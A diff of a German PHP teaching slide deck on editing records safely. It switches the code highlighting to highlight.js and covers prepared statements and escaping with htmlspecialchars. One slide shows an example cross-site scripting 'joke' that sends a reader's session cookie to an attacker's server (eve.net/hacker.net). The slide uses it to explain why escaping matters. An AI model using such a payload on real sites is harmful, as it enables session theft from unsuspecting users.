@@ -5,6 +5,9 @@
     <title>Daten Bearbeiten - als Präsentation</title>
     <meta name="viewport" content="width=1024, user-scalable=no" />
 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+
+
     <!-- Replace path with correct path to deck.core.css. -->
     <link rel="stylesheet" href="/assets/css/deck.core.css" type="text/css" />
     <link rel="stylesheet" href="/assets/css/style-theme.css" type="text/css" />
@@ -93,11 +96,10 @@ da die ID aus dem GET-Parameter gelesen wurde:</p>
 
 <div class="example">
 <h4 class="caption">Php Code <small>laden des Datensatzes, der editiert werden soll</small></h4>
-<pre class="lang-php prettyprint linenums">
-$sth = $dbh-&gt;prepare( &quot;SELECT * FROM users WHERE id=?&quot; );
+<pre><code class="language-php  linenums">$sth = $dbh-&gt;prepare( &quot;SELECT * FROM users WHERE id=?&quot; );
 $sth-&gt;execute( array( $id ) );
 $person = $sth-&gt;fetch();
-</pre></div>
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -109,10 +111,9 @@ Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute
 und bei Textareas als Inhalt des Tags:</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;input name=&quot;firstname&quot; value=&quot;Tobias&quot;&gt;
+<pre><code class="language-html  linenums">&lt;input name=&quot;firstname&quot; value=&quot;Tobias&quot;&gt;
 &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Webdesigner&lt;/textarea&gt;
-</pre></div>
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -124,21 +125,19 @@ Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein
 Beispiel:</p>
 
 <div class="example">
-<pre class="lang-sql prettyprint linenums">
-portfolio_playground=# select firstname,description from users where id=438;
+<pre><code class="language-sql  linenums">portfolio_playground=# select firstname,description from users where id=438;
      firstname      |          description
 --------------------+--------------------------------
  Tobias &quot;the Coder&quot; | Mein Lieblings-Tag ist &lt;style&gt;
 (1 row)
-</pre></div>
+</code></pre></div>
 
 <p>So würde die Darstellung der Eingabefelder nicht funktionieren:</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;input name=&quot;firstname&quot; value=&quot;Tobias &quot;the Coder&quot;&quot;&gt;
+<pre><code class="language-html  linenums">&lt;input name=&quot;firstname&quot; value=&quot;Tobias &quot;the Coder&quot;&quot;&gt;
 &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &lt;style&gt;&lt;/textarea&gt;
-</pre></div>
+</code></pre></div>
 
 <p>Das Attribut <code>value</code> endet zu früh, und der <code>&lt;style&gt;</code> Tag lässt
 den Rest der Webseite verschwinden.</p>
@@ -151,18 +150,16 @@ den Rest der Webseite verschwinden.</p>
 <p>Richtig ist die Darstellung gewisser Zeichen als HTML Entities:</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;input name=&quot;firstname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot;&quot;&gt;
+<pre><code class="language-html  linenums">&lt;input name=&quot;firstname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot;&quot;&gt;
 &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &amp;lt;style&amp;gt;&lt;/textarea&gt;
-</pre></div>
+</code></pre></div>
 
 <p>Diese Ersetzung wird mit der Funktion
 <code>htmlspecialchars</code><a href="http://www.php.net/manual/en/function.htmlspecialchars.php">→</a> vorgenommen:</p>
 
 <div class="example">
-<pre class="lang-php prettyprint linenums">
-htmlspecialchars( $person-&gt;firstname );
-</pre></div>
+<pre><code class="language-php  linenums">htmlspecialchars( $person-&gt;firstname );
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -173,10 +170,9 @@ htmlspecialchars( $person-&gt;firstname );
 
 <div class="example">
 <h4 class="caption">Php Code <small>Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP</small></h4>
-<pre class="lang-php prettyprint linenums">
-&lt;input name=&quot;firstname&quot; value=&quot;&lt;?= htmlspecialchars( $person-&gt;firstname ); ?&gt;&quot;&gt;
+<pre><code class="language-php  linenums">&lt;input name=&quot;firstname&quot; value=&quot;&lt;?= htmlspecialchars( $person-&gt;firstname ); ?&gt;&quot;&gt;
 &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;&lt;?= htmlspecialchars( $person-&gt;description ); ?&gt;&lt;/textarea&gt;
-</pre></div>
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -187,13 +183,11 @@ htmlspecialchars( $person-&gt;firstname );
 
 <div class="example">
 <h4 class="caption">Php Code <small>Update der Daten von PHP aus</small></h4>
-<pre class="lang-php prettyprint linenums">
-$sth = $dbh-&gt;prepare(
+<pre><code class="language-php  linenums">$sth = $dbh-&gt;prepare(
   &quot;UPDATE users SET
     firstname=?,surname=?,email=?,
     profile_visible=?,description=?
    WHERE id=?&quot;);
-
 $update_went_ok = $sth-&gt;execute(
   array(
     $_POST[&#39;firstname&#39;],
@@ -204,10 +198,9 @@ $update_went_ok = $sth-&gt;execute(
     $_POST[&#39;id&#39;]
   )
 );
-
 header(&quot;Location: person.php?id=&quot; . $_POST[&#39;id&#39;]);
 exit;
-</pre></div>
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -217,12 +210,11 @@ exit;
 
 <div class="example">
 <h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank ohne html-escaping</small></h4>
-<pre class="lang-php prettyprint linenums">
-&lt;?php echo $person-&gt;firstname ?&gt;
+<pre><code class="language-php  linenums">&lt;?php echo $person-&gt;firstname ?&gt;
 &lt;?php echo $person-&gt;surname ?&gt;
 hat insgesamt  &lt;?php echo $no ?&gt; Werke in dieser Datenbank.
 // problematisch!
-</pre></div>
+</code></pre></div>
 
 </div>
 <div class="slide">
@@ -233,20 +225,17 @@ hat insgesamt  &lt;?php echo $no ?&gt; Werke in dieser Datenbank.
 
 <div class="example">
 <h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank mit html-escaping</small></h4>
-<pre class="lang-php prettyprint linenums">
-$username    = htmlspecialchars( $person-&gt;username     );
+<pre><code class="language-php  linenums">$username    = htmlspecialchars( $person-&gt;username     );
 $firstname   = htmlspecialchars( $person-&gt;firstname    );
 $surname     = htmlspecialchars( $person-&gt;surname      );
 $description = htmlspecialchars( $person-&gt;description  );
-
 echo &lt;&lt;&lt;EOM
   &lt;p&gt;$anrede $vorname $nachname hat insgesamt
   $no Werke in dieser Datenbank.
   $ersie hat den Usernamen $username.&lt;/p&gt;
-
   &lt;div&gt;$description&lt;/div&gt;
 EOM;
-</pre></div>
+</code></pre></div>
 
 <p>Damit funktioniert nun die Darstellung des Datensatzes richtig:</p>
 
@@ -270,22 +259,20 @@ braucht mein drei Personen:</p>
 <p>So könnte der “Witz” aussehen, den Eve eingibt:</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-JavaScript ist doof!
+<pre><code class="language-html  linenums">JavaScript ist doof!
 &lt;img src=&quot;http://eve.net/bild.php&quot; alt=&quot;harmlos&quot; id=&quot;hack_tool&quot; /&gt;
 &lt;script&gt;
 document.getElementById(&quot;hack_tool&quot;).src += &quot;?c=&quot; + document.cookie;
 &lt;/script&gt;
-</pre></div>
+</code></pre></div>
 
 <p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-JavaScript ist doof!
+<pre><code class="language-html  linenums">JavaScript ist doof!
 &lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot;
 src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
-</pre></div>
+</code></pre></div>
 
 <p>Wenn nun Bernhard diesen Witz liest, dann wird sein Cookie an den Server von Eve gesendet.</p>
 
@@ -293,11 +280,10 @@ src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb07
 Bild angezeigt worden, sondern als</p>
 
 <div class="example">
-<pre class="lang-html prettyprint linenums">
-JavaScript ist doof!
+<pre><code class="language-html  linenums">JavaScript ist doof!
 &amp;lt;img id=&amp;quot;hack_tool&amp;quot; alt=&amp;quot;harmloses bild&amp;quot;
 src=&amp;quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&amp;quot;/&amp;gt;
-</pre></div>
+</code></pre></div>
 
 <p>Escaping ist also ein wichtige Maßnahme gegen Cross Site Scripting.</p>
 
@@ -345,5 +331,12 @@ src=&amp;quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126f
 
     <!-- Initialize the deck. You can put this in an external file if desired. -->
     <script src="/assets/js/godeck.js"></script>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
+    <script>hljs.highlightAll();</script>
   </body>
 </html>
